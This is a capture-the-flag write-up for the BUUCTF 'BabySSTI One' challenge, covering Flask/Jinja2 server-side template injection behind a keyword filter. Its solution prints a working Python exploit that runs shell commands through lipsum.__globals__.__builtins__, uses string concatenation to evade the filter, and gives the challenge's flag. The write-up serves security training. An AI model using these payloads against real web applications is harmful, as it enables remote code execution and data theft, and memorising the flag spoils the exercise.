---
title: "[NewStarCTF 公开赛赛道]BabySSTI One"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [ssti, jinja2, flask, waf-bypass]
vulnerability: Flask/Jinja2 SSTI + WAF 绕过
solved: true
flag: "flag{21223425-916e-474b-940d-c26754d5e19a}"
---

# BabySSTI_One

## Summary

Flask/Jinja2 SSTI challenge with WAF filtering underscore (`_`), `flag`, `cat`, and other keywords. Bypassed by using `lipsum.__globals__` to access Python builtins (attribute access with `__` not filtered), and string concatenation to evade keyword filters.

## Solution

### Step 1: Identify SSTI and WAF

The challenge accepts a `name` parameter that reflects user input. Basic SSTI test `{{7*7}}` returns `49`. Testing reveals:
- `_` is blocked inside template expressions
- `flag` and `cat` strings are blocked

The hint confirms: "Flask SSTI is so easy to bypass waf!"

### Step 2: Bypass via lipsum and string concatenation

Use `lipsum.__globals__.__builtins__` to access Python's `os` module and execute commands. String concatenation (`'fla'+'g_in_here'`) bypasses the `flag` filter.

```python
import requests
import urllib.parse

BASE = "http://target:81/"

# Bypass: lipsum.__globals__ works despite underscore filter
# Bypass: string concatenation for 'flag'
payload = "{{lipsum.__globals__.__builtins__.__import__('os').popen('head /fla'+'g_in_here').read()}}"

r = requests.get(f"{BASE}?name={urllib.parse.quote(payload)}")
print(r.text.split("Dear ")[1].split("</center>")[0])
# Output: flag{21223425-916e-474b-940d-c26754d5e19a}
```

Alternative using Python's `open()`:
```python
payload = "{{lipsum.__globals__.__builtins__.open('/fla'+'g_in_here').read()}}"
```

## Flag

```
flag{21223425-916e-474b-940d-c26754d5e19a}
```
